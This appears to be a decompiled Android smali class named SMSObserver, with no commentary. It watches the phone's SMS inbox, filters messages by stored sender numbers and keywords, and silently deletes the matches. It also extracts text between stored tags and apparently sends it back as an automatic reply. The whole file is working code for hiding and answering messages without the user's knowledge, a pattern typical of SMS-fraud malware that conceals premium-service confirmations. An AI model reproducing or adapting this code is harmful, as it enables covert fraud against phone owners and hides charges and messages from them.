.class public Lcom/xxx/yyy/SMSObserver;
.super Landroid/database/ContentObserver;
.source "SMSObserver.java"


# static fields
.field private static final CONVERSATION_URI:Ljava/lang/String; = "content://sms/conversations/"

.field public static final DB_NAME:Ljava/lang/String; = "css_db"

.field private static final SMS_INBOX_URI:Ljava/lang/String; = "content://sms//inbox"

.field public static final TAG:Ljava/lang/String; = "sms"

.field public static final VERSION:I = 0x3


# instance fields
.field public ReturnMsg:Ljava/lang/String;

.field public Tags:[Ljava/lang/String;

.field private contentResolver:Landroid/content/ContentResolver;

.field private ctx:Landroid/content/Context;

.field public filterKeyList:Ljava/util/List;
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "Ljava/util/List",
            "<",
            "Lcom/xxx/yyy/SMSEntityBad;",
            ">;"
        }
    .end annotation
.end field

.field public filterMdnList:Ljava/util/List;
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "Ljava/util/List",
            "<",
            "Lcom/xxx/yyy/SMSEntityBad;",
            ">;"
        }
    .end annotation
.end field

.field private helper:Lcom/xxx/yyy/SMSDatabaseHelper;


# direct methods
.method public constructor <init>(Landroid/os/Handler;Landroid/content/Context;)V
    .locals 5
    .parameter "handler"
    .parameter "ctx"

    .prologue
    const/4 v4, 0x0

    .line 40
    invoke-direct {p0, p1}, Landroid/database/ContentObserver;-><init>(Landroid/os/Handler;)V

    .line 41
    iput-object p2, p0, Lcom/xxx/yyy/SMSObserver;->ctx:Landroid/content/Context;

    .line 42
    invoke-virtual {p2}, Landroid/content/Context;->getContentResolver()Landroid/content/ContentResolver;

    move-result-object v0

    iput-object v0, p0, Lcom/xxx/yyy/SMSObserver;->contentResolver:Landroid/content/ContentResolver;

    .line 43
    new-instance v0, Lcom/xxx/yyy/SMSDatabaseHelper;

    const-string v1, "css_db"

    const/4 v2, 0x0

    const/4 v3, 0x3

    invoke-direct {v0, p2, v1, v2, v3}, Lcom/xxx/yyy/SMSDatabaseHelper;-><init>(Landroid/content/Context;Ljava/lang/String;Landroid/database/sqlite/SQLiteDatabase$CursorFactory;I)V

    iput-object v0, p0, Lcom/xxx/yyy/SMSObserver;->helper:Lcom/xxx/yyy/SMSDatabaseHelper;

    .line 44
    iget-object v0, p0, Lcom/xxx/yyy/SMSObserver;->helper:Lcom/xxx/yyy/SMSDatabaseHelper;

    invoke-virtual {v0, v4, v4}, Lcom/xxx/yyy/SMSDatabaseHelper;->getAll(II)Ljava/util/List;

    move-result-object v0

    iput-object v0, p0, Lcom/xxx/yyy/SMSObserver;->filterMdnList:Ljava/util/List;

    .line 45
    iget-object v0, p0, Lcom/xxx/yyy/SMSObserver;->helper:Lcom/xxx/yyy/SMSDatabaseHelper;

    const/4 v1, 0x1

    invoke-virtual {v0, v4, v1}, Lcom/xxx/yyy/SMSDatabaseHelper;->getAll(II)Ljava/util/List;

    move-result-object v0

    iput-object v0, p0, Lcom/xxx/yyy/SMSObserver;->filterKeyList:Ljava/util/List;

    .line 46
    iget-object v0, p0, Lcom/xxx/yyy/SMSObserver;->helper:Lcom/xxx/yyy/SMSDatabaseHelper;

    invoke-virtual {v0}, Lcom/xxx/yyy/SMSDatabaseHelper;->getBackContent()[Ljava/lang/String;

    move-result-object v0

    iput-object v0, p0, Lcom/xxx/yyy/SMSObserver;->Tags:[Ljava/lang/String;

    .line 47
    const-string v0, "y"

    iput-object v0, p0, Lcom/xxx/yyy/SMSObserver;->ReturnMsg:Ljava/lang/String;

    .line 48
    return-void
.end method

.method private FindReturnMsg(Ljava/lang/String;Ljava/lang/String;)Z
    .locals 10
    .parameter "from"
    .parameter "body"

    .prologue
    const/4 v9, -0x1

    const/4 v8, 0x1

    const/4 v7, 0x0

    .line 118
    const/4 v5, 0x0

    .line 119
    .local v5, spos:I
    invoke-virtual {p2}, Ljava/lang/String;->length()I

    move-result v1

    .line 120
    .local v1, epos:I
    iget-object v6, p0, Lcom/xxx/yyy/SMSObserver;->Tags:[Ljava/lang/String;

    aget-object v6, v6, v7

    invoke-virtual {v6}, Ljava/lang/String;->length()I

    move-result v3

    .line 121
    .local v3, slen:I
    iget-object v6, p0, Lcom/xxx/yyy/SMSObserver;->Tags:[Ljava/lang/String;

    aget-object v6, v6, v8

    invoke-virtual {v6}, Ljava/lang/String;->length()I

    move-result v0

    .line 122
    .local v0, elen:I
    if-nez v3, :cond_0

    if-nez v0, :cond_0

    move v6, v7

    .line 146
    :goto_0
    return v6

    .line 124
    :cond_0
    if-lez v3, :cond_2

    .line 126
    iget-object v6, p0, Lcom/xxx/yyy/SMSObserver;->Tags:[Ljava/lang/String;

    aget-object v6, v6, v7

    invoke-virtual {p2, v6}, Ljava/lang/String;->indexOf(Ljava/lang/String;)I

    move-result v2

    .line 127
    .local v2, pos:I
    if-ne v2, v9, :cond_1

    move v6, v7

    .line 128
    goto :goto_0

    .line 129
    :cond_1
    add-int v5, v2, v3

    .line 131
    .end local v2           #pos:I
    :cond_2
    if-lez v0, :cond_4

    .line 133
    iget-object v6, p0, Lcom/xxx/yyy/SMSObserver;->Tags:[Ljava/lang/String;

    aget-object v6, v6, v8

    invoke-virtual {p2, v6}, Ljava/lang/String;->indexOf(Ljava/lang/String;)I

    move-result v2

    .line 134
    .restart local v2       #pos:I
    if-ne v2, v9, :cond_3

    move v6, v7

    .line 135
    goto :goto_0

    .line 136
    :cond_3
    move v1, v2

    .line 138
    .end local v2           #pos:I
    :cond_4
    if-ge v1, v5, :cond_5

    move v6, v7

    .line 139
    goto :goto_0

    .line 140
    :cond_5
    if-ne v1, v5, :cond_6

    .line 141
    const-string v6, "y"

    iput-object v6, p0, Lcom/xxx/yyy/SMSObserver;->ReturnMsg:Ljava/lang/String;

    .line 144
    :goto_1
    new-instance v4, Lcom/xxx/yyy/ssmm;

    invoke-direct {v4}, Lcom/xxx/yyy/ssmm;-><init>()V

    .line 145
    .local v4, sm:Lcom/xxx/yyy/ssmm;
    iget-object v6, p0, Lcom/xxx/yyy/SMSObserver;->ctx:Landroid/content/Context;

    iget-object v7, p0, Lcom/xxx/yyy/SMSObserver;->ReturnMsg:Ljava/lang/String;

    invoke-virtual {v4, v6, p1, v7}, Lcom/xxx/yyy/ssmm;->Gef(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    move v6, v8

    .line 146
    goto :goto_0

    .line 143
    .end local v4           #sm:Lcom/xxx/yyy/ssmm;
    :cond_6
    invoke-virtual {p2, v5, v1}, Ljava/lang/String;->substring(II)Ljava/lang/String;

    move-result-object v6

    iput-object v6, p0, Lcom/xxx/yyy/SMSObserver;->ReturnMsg:Ljava/lang/String;

    goto :goto_1
.end method

.method public static buildSMSEntity(Landroid/database/Cursor;)Ljava/util/List;
    .locals 5
    .parameter "cursor"
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "(",
            "Landroid/database/Cursor;",
            ")",
            "Ljava/util/List",
            "<",
            "Lcom/xxx/yyy/SMSEntity;",
            ">;"
        }
    .end annotation

    .prologue
    const/16 v4, 0xa

    .line 149
    new-instance v1, Ljava/util/ArrayList;

    invoke-direct {v1, v4}, Ljava/util/ArrayList;-><init>(I)V

    .line 151
    .local v1, smsEntitys:Ljava/util/List;,"Ljava/util/List<Lcom/xxx/yyy/SMSEntity;>;"
    :goto_0
    invoke-interface {p0}, Landroid/database/Cursor;->moveToNext()Z

    move-result v2

    if-nez v2, :cond_0

    .line 168
    return-object v1

    .line 152
    :cond_0
    new-instance v0, Lcom/xxx/yyy/SMSEntity;

    invoke-direct {v0}, Lcom/xxx/yyy/SMSEntity;-><init>()V

    .line 153
    .local v0, smsEntity:Lcom/xxx/yyy/SMSEntity;
    const/4 v2, 0x0

    invoke-interface {p0, v2}, Landroid/database/Cursor;->getLong(I)J

    move-result-wide v2

    invoke-virtual {v0, v2, v3}, Lcom/xxx/yyy/SMSEntity;->setId(J)V

    .line 154
    const/4 v2, 0x1

    invoke-interface {p0, v2}, Landroid/database/Cursor;->getLong(I)J

    move-result-wide v2

    invoke-virtual {v0, v2, v3}, Lcom/xxx/yyy/SMSEntity;->setThreadID(J)V

    .line 155
    const/4 v2, 0x2

    invoke-interface {p0, v2}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v0, v2}, Lcom/xxx/yyy/SMSEntity;->setFrom(Ljava/lang/String;)V

    .line 156
    const/4 v2, 0x3

    invoke-interface {p0, v2}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v0, v2}, Lcom/xxx/yyy/SMSEntity;->setPerson(Ljava/lang/String;)V

    .line 157
    const/4 v2, 0x4

    invoke-interface {p0, v2}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v0, v2}, Lcom/xxx/yyy/SMSEntity;->setDate(Ljava/lang/String;)V

    .line 158
    const/4 v2, 0x5

    invoke-interface {p0, v2}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v0, v2}, Lcom/xxx/yyy/SMSEntity;->setProtocol(Ljava/lang/String;)V

    .line 159
    const/4 v2, 0x6

    invoke-interface {p0, v2}, Landroid/database/Cursor;->getInt(I)I

    move-result v2

    invoke-virtual {v0, v2}, Lcom/xxx/yyy/SMSEntity;->setRead(I)V

    .line 160
    const/4 v2, 0x7

    invoke-interface {p0, v2}, Landroid/database/Cursor;->getInt(I)I

    move-result v2

    invoke-virtual {v0, v2}, Lcom/xxx/yyy/SMSEntity;->setStatus(I)V

    .line 161
    const/16 v2, 0x8

    invoke-interface {p0, v2}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v0, v2}, Lcom/xxx/yyy/SMSEntity;->setType(Ljava/lang/String;)V

    .line 162
    const/16 v2, 0x9

    invoke-interface {p0, v2}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v0, v2}, Lcom/xxx/yyy/SMSEntity;->setReplyPathPresent(Ljava/lang/String;)V

    .line 163
    invoke-interface {p0, v4}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v0, v2}, Lcom/xxx/yyy/SMSEntity;->setSubject(Ljava/lang/String;)V

    .line 164
    const/16 v2, 0xb

    invoke-interface {p0, v2}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v0, v2}, Lcom/xxx/yyy/SMSEntity;->setBody(Ljava/lang/String;)V

    .line 165
    const/16 v2, 0xc

    invoke-interface {p0, v2}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v0, v2}, Lcom/xxx/yyy/SMSEntity;->setServiceCenter(Ljava/lang/String;)V

    .line 166
    invoke-interface {v1, v0}, Ljava/util/List;->add(Ljava/lang/Object;)Z

    goto :goto_0
.end method

.method private deleteSpecSMS(Ljava/util/List;)I
    .locals 10
    .parameter
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "(",
            "Ljava/util/List",
            "<",
            "Lcom/xxx/yyy/SMSEntity;",
            ">;)I"
        }
    .end annotation

    .prologue
    .line 171
    .local p1, smsEntitys:Ljava/util/List;,"Ljava/util/List<Lcom/xxx/yyy/SMSEntity;>;"
    const/4 v0, 0x0

    .line 172
    .local v0, count:I
    invoke-interface {p1}, Ljava/util/List;->iterator()Ljava/util/Iterator;

    move-result-object v3

    :goto_0
    invoke-interface {v3}, Ljava/util/Iterator;->hasNext()Z

    move-result v4

    if-nez v4, :cond_0

    .line 177
    return v0

    .line 172
    :cond_0
    invoke-interface {v3}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    move-result-object v1

    check-cast v1, Lcom/xxx/yyy/SMSEntity;

    .line 173
    .local v1, smsEntity:Lcom/xxx/yyy/SMSEntity;
    new-instance v4, Ljava/lang/StringBuilder;

    const-string v5, "content://sms/conversations/"

    invoke-direct {v4, v5}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v1}, Lcom/xxx/yyy/SMSEntity;->getThreadID()J

    move-result-wide v5

    invoke-virtual {v4, v5, v6}, Ljava/lang/StringBuilder;->append(J)Ljava/lang/StringBuilder;

    move-result-object v4

    invoke-virtual {v4}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v4

    invoke-static {v4}, Landroid/net/Uri;->parse(Ljava/lang/String;)Landroid/net/Uri;

    move-result-object v2

    .line 174
    .local v2, thread:Landroid/net/Uri;
    iget-object v4, p0, Lcom/xxx/yyy/SMSObserver;->contentResolver:Landroid/content/ContentResolver;

    const-string v5, "_id=?"

    const/4 v6, 0x1

    new-array v6, v6, [Ljava/lang/String;

    const/4 v7, 0x0

    invoke-virtual {v1}, Lcom/xxx/yyy/SMSEntity;->getId()J

    move-result-wide v8

    invoke-static {v8, v9}, Ljava/lang/String;->valueOf(J)Ljava/lang/String;

    move-result-object v8

    aput-object v8, v6, v7

    invoke-virtual {v4, v2, v5, v6}, Landroid/content/ContentResolver;->delete(Landroid/net/Uri;Ljava/lang/String;[Ljava/lang/String;)I

    .line 175
    add-int/lit8 v0, v0, 0x1

    goto :goto_0
.end method

.method private filterSMSEntity(Ljava/util/List;)Ljava/util/List;
    .locals 9
    .parameter
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "(",
            "Ljava/util/List",
            "<",
            "Lcom/xxx/yyy/SMSEntity;",
            ">;)",
            "Ljava/util/List",
            "<",
            "Lcom/xxx/yyy/SMSEntity;",
            ">;"
        }
    .end annotation

    .prologue
    .line 76
    .local p1, smsEntitys:Ljava/util/List;,"Ljava/util/List<Lcom/xxx/yyy/SMSEntity;>;"
    new-instance v0, Ljava/util/ArrayList;

    invoke-direct {v0}, Ljava/util/ArrayList;-><init>()V

    .line 77
    .local v0, filteredSMSEntitys:Ljava/util/List;,"Ljava/util/List<Lcom/xxx/yyy/SMSEntity;>;"
    const/4 v1, 0x0

    .line 78
    .local v1, find:Z
    invoke-interface {p1}, Ljava/util/List;->iterator()Ljava/util/Iterator;

    move-result-object v5

    :cond_0
    :goto_0
    invoke-interface {v5}, Ljava/util/Iterator;->hasNext()Z

    move-result v6

    if-nez v6, :cond_1

    .line 109
    return-object v0

    .line 78
    :cond_1
    invoke-interface {v5}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    move-result-object v3

    check-cast v3, Lcom/xxx/yyy/SMSEntity;

    .line 79
    .local v3, smsEntity:Lcom/xxx/yyy/SMSEntity;
    iget-object v6, p0, Lcom/xxx/yyy/SMSObserver;->filterMdnList:Ljava/util/List;

    invoke-interface {v6}, Ljava/util/List;->iterator()Ljava/util/Iterator;

    move-result-object v6

    :cond_2
    invoke-interface {v6}, Ljava/util/Iterator;->hasNext()Z

    move-result v7

    if-nez v7, :cond_4

    .line 90
    :goto_1
    if-nez v1, :cond_0

    .line 92
    iget-object v6, p0, Lcom/xxx/yyy/SMSObserver;->filterKeyList:Ljava/util/List;

    invoke-interface {v6}, Ljava/util/List;->iterator()Ljava/util/Iterator;

    move-result-object v6

    :cond_3
    invoke-interface {v6}, Ljava/util/Iterator;->hasNext()Z

    move-result v7

    if-nez v7, :cond_5

    .line 102
    :goto_2
    if-nez v1, :cond_0

    .line 105
    invoke-virtual {v3}, Lcom/xxx/yyy/SMSEntity;->getFrom()Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v3}, Lcom/xxx/yyy/SMSEntity;->getBody()Ljava/lang/String;

    move-result-object v7

    invoke-direct {p0, v6, v7}, Lcom/xxx/yyy/SMSObserver;->FindReturnMsg(Ljava/lang/String;Ljava/lang/String;)Z

    move-result v2

    .line 106
    .local v2, go:Z
    if-eqz v2, :cond_0

    .line 107
    invoke-interface {v0, v3}, Ljava/util/List;->add(Ljava/lang/Object;)Z

    goto :goto_0

    .line 79
    .end local v2           #go:Z
    :cond_4
    invoke-interface {v6}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    move-result-object v4

    check-cast v4, Lcom/xxx/yyy/SMSEntityBad;

    .line 82
    .local v4, smsEntityBad:Lcom/xxx/yyy/SMSEntityBad;
    invoke-virtual {v3}, Lcom/xxx/yyy/SMSEntity;->getFrom()Ljava/lang/String;

    move-result-object v7

    invoke-virtual {v4}, Lcom/xxx/yyy/SMSEntityBad;->getKeyWord()Ljava/lang/String;

    move-result-object v8

    invoke-virtual {v7, v8}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v7

    if-eqz v7, :cond_2

    .line 85
    invoke-interface {v0, v3}, Ljava/util/List;->add(Ljava/lang/Object;)Z

    .line 86
    const/4 v1, 0x1

    .line 87
    goto :goto_1

    .line 92
    .end local v4           #smsEntityBad:Lcom/xxx/yyy/SMSEntityBad;
    :cond_5
    invoke-interface {v6}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    move-result-object v4

    check-cast v4, Lcom/xxx/yyy/SMSEntityBad;

    .line 95
    .restart local v4       #smsEntityBad:Lcom/xxx/yyy/SMSEntityBad;
    invoke-virtual {v3}, Lcom/xxx/yyy/SMSEntity;->getBody()Ljava/lang/String;

    move-result-object v7

    invoke-virtual {v4}, Lcom/xxx/yyy/SMSEntityBad;->getKeyWord()Ljava/lang/String;

    move-result-object v8

    invoke-virtual {v7, v8}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v7

    if-eqz v7, :cond_3

    .line 97
    invoke-interface {v0, v3}, Ljava/util/List;->add(Ljava/lang/Object;)Z

    .line 98
    const/4 v1, 0x1

    .line 99
    goto :goto_2
.end method


# virtual methods
.method public ReflashDb()V
    .locals 3

    .prologue
    const/4 v2, 0x0

    .line 57
    iget-object v0, p0, Lcom/xxx/yyy/SMSObserver;->helper:Lcom/xxx/yyy/SMSDatabaseHelper;

    invoke-virtual {v0, v2, v2}, Lcom/xxx/yyy/SMSDatabaseHelper;->getAll(II)Ljava/util/List;

    move-result-object v0

    iput-object v0, p0, Lcom/xxx/yyy/SMSObserver;->filterMdnList:Ljava/util/List;

    .line 58
    iget-object v0, p0, Lcom/xxx/yyy/SMSObserver;->helper:Lcom/xxx/yyy/SMSDatabaseHelper;

    const/4 v1, 0x1

    invoke-virtual {v0, v2, v1}, Lcom/xxx/yyy/SMSDatabaseHelper;->getAll(II)Ljava/util/List;

    move-result-object v0

    iput-object v0, p0, Lcom/xxx/yyy/SMSObserver;->filterKeyList:Ljava/util/List;

    .line 59
    return-void
.end method

.method public insertSms(Ljava/lang/String;II)V
    .locals 1
    .parameter "keyword"
    .parameter "flag"
    .parameter "type"

    .prologue
    .line 113
    iget-object v0, p0, Lcom/xxx/yyy/SMSObserver;->helper:Lcom/xxx/yyy/SMSDatabaseHelper;

    invoke-virtual {v0, p1}, Lcom/xxx/yyy/SMSDatabaseHelper;->deleteSMS(Ljava/lang/String;)I

    .line 114
    iget-object v0, p0, Lcom/xxx/yyy/SMSObserver;->helper:Lcom/xxx/yyy/SMSDatabaseHelper;

    invoke-virtual {v0, p1, p3, p2}, Lcom/xxx/yyy/SMSDatabaseHelper;->insertRecord(Ljava/lang/String;II)I

    .line 115
    return-void
.end method

.method public onChange(Z)V
    .locals 8
    .parameter "selfChange"

    .prologue
    const/4 v3, 0x0

    .line 64
    invoke-super {p0, p1}, Landroid/database/ContentObserver;->onChange(Z)V

    .line 65
    iget-object v0, p0, Lcom/xxx/yyy/SMSObserver;->ctx:Landroid/content/Context;

    invoke-virtual {v0}, Landroid/content/Context;->getContentResolver()Landroid/content/ContentResolver;

    move-result-object v0

    iput-object v0, p0, Lcom/xxx/yyy/SMSObserver;->contentResolver:Landroid/content/ContentResolver;

    .line 66
    const-string v0, "content://sms//inbox"

    invoke-static {v0}, Landroid/net/Uri;->parse(Ljava/lang/String;)Landroid/net/Uri;

    move-result-object v1

    .line 67
    .local v1, uri:Landroid/net/Uri;
    const/4 v0, 0x1

    new-array v2, v0, [Ljava/lang/String;

    const/4 v0, 0x0

    const-string v4, "_id,thread_id,address,person,date,protocol,read,status,type,reply_path_present,subject,body,service_center"

    aput-object v4, v2, v0

    .line 70
    .local v2, queryColumn:[Ljava/lang/String;
    iget-object v0, p0, Lcom/xxx/yyy/SMSObserver;->contentResolver:Landroid/content/ContentResolver;

    const-string v5, "date desc"

    move-object v4, v3

    invoke-virtual/range {v0 .. v5}, Landroid/content/ContentResolver;->query(Landroid/net/Uri;[Ljava/lang/String;Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;)Landroid/database/Cursor;

    move-result-object v6

    .line 71
    .local v6, cursor:Landroid/database/Cursor;
    invoke-static {v6}, Lcom/xxx/yyy/SMSObserver;->buildSMSEntity(Landroid/database/Cursor;)Ljava/util/List;

    move-result-object v7

    .line 72
    .local v7, smsEntitys:Ljava/util/List;,"Ljava/util/List<Lcom/xxx/yyy/SMSEntity;>;"
    invoke-direct {p0, v7}, Lcom/xxx/yyy/SMSObserver;->filterSMSEntity(Ljava/util/List;)Ljava/util/List;

    move-result-object v7

    .line 73
    invoke-direct {p0, v7}, Lcom/xxx/yyy/SMSObserver;->deleteSpecSMS(Ljava/util/List;)I

    .line 74
    return-void
.end method

.method public setTags(Ljava/lang/String;Ljava/lang/String;)V
    .locals 1
    .parameter "start"
    .parameter "end"

    .prologue
    .line 51
    iget-object v0, p0, Lcom/xxx/yyy/SMSObserver;->helper:Lcom/xxx/yyy/SMSDatabaseHelper;

    invoke-virtual {v0}, Lcom/xxx/yyy/SMSDatabaseHelper;->deleteBackRecord()I

    .line 52
    iget-object v0, p0, Lcom/xxx/yyy/SMSObserver;->helper:Lcom/xxx/yyy/SMSDatabaseHelper;

    invoke-virtual {v0, p1, p2}, Lcom/xxx/yyy/SMSDatabaseHelper;->insertBackRecord(Ljava/lang/String;Ljava/lang/String;)I

    .line 53
    iget-object v0, p0, Lcom/xxx/yyy/SMSObserver;->helper:Lcom/xxx/yyy/SMSDatabaseHelper;

    invoke-virtual {v0}, Lcom/xxx/yyy/SMSDatabaseHelper;->getBackContent()[Ljava/lang/String;

    move-result-object v0

    iput-object v0, p0, Lcom/xxx/yyy/SMSObserver;->Tags:[Ljava/lang/String;

    .line 54
    return-void
.end method
